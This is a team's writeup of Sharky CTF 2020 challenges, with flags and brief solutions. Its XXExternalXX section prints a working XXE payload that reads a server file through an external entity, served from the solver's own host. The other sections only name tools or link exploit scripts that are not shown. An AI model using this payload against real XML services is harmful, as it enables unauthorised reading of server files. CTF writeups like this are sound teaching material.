# Sharky CTF 2020
`PaperPlaneJr` `429 pts` `376th`

> 2020/05/09 08:01 - 2020/05/11 07:59  
> https://ctfd.sharkyctf.xyz  
> 24.58


## Writeup

### XXExternalXX
`web` `shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}`

> One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.
> 
> xxexternalxx.sharkyctf.xyz
> 
> Creator : Remsio

> [poc](./XXExternalXX/exp.xml)

It seems that the `Show stored data` page will render a xml file
    which set with GET parameter.
The link is http://xxexternalxx.sharkyctf.xyz/?xml=data.xml

We first try to see whether it can access file with `http` and the answer is yes.
The next step is to generate a xml file and get the flag.

We first download the `data.xml` to check the format.

```xml
data.xml
--------
<root>
    <data>17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs</data>
</root>
```

It is obvious that we have to put our content in `<data>` tags.
Then it's a simple XXE.

```xml
exp.xml
-------
<!DOCTYPE exp[
    <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
    <data>&xxe;</data>
</root>
```

Put the file on your web server, then query it by
    `http://xxexternalxx.sharkyctf.xyz/?xml=http://<ip>/exp.xml`.

### Welcome
`misc` `shkCTF{N0W_G3T_TH3_5H4RKY_68caef0fd1aa55bad4d34e556198e8bf}`

> Join us on discord :-)
> 
> https://discord.gg/xaqMb44

### Trolled
`misc` `shkCTF{y0u_h4v3_b33n_tr0ll3d_by_2phi_5298158640e3a8d4e7e7d51}`

> Troller: 2phi 

We use `BurpSuite` to log web request and find that the problem will request
    `/shkCTF%7By0u_h4v3_b33n_tr0ll3d_by_2phi_5298158640e3a8d4e7e7d51%7D`,
    which is the flag.

### Simple
`reverse` `shkCTF{h3ll0_fr0m_ASM_my_fr13nd}`

> A really simple crackme to get started ;) Your goal is to find the correct input so that the program return 1. The correct input will be the flag.
> 
> Creator : Nofix
> 
> [main.asm](./reverse.Simple/main.asm)

> [poc](./reverse.Simple/sol.py)

### basic LSB
`steganography` `shkCTF{Y0u_foUnD_m3_thr0ugH_LSB_6a5e99dfacf793e27a}`

> I intercepted an image in the communication of 2 sharkies from a shark gang. Those sharks knew I was listening and they hid a message in this image.
> 
> Do you think you can do something about it?
> 
> Creator: Fratso
> 
> [pretty_cat.png](./steganography.basic_LSB/pretty_cat.png)

By the name of the problem,
    use [steganography online tool](https://stylesuxx.github.io/steganography/)
    to decode.

### Give away 0
`pwn` `shkCTF{#Fr33_fL4g!!_<3}>}`

> Home sweet home.
> 
> Creator: Hackhim
> 
> nc sharkyctf.xyz 20333
>
> [0_give_away](./pwn.Give_away_0/0_give_away)

> [poc](./pwn.Give_away_0/exp.py)

Simple bof.


## Unsolved

### Give away 1
`pwn`

> Make good use of this gracious give away.
> 
> nc sharkyctf.xyz 20334
> 
> Creator: Hackhim
>
> [give_away_1](./pwn.Give_away_1/give_away_1) [libc-2.27.so](./pwn.Give_away_1/libc-2.27.so)
